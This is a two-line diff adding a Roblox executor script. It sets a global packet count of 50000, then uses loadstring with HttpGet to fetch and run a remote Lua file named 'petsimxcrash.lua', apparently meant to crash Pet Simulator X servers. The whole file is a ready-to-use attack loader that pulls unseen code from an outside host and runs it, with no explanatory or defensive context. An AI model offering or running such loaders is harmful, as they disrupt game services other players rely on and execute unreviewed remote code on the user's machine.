@@ -1,0 +1,2 @@
+getgenv().packets = 50000
+loadstring(game:HttpGet("https://raw.githubusercontent.com/migu-star/Scripts/main/petsimxcrash.lua"))() 
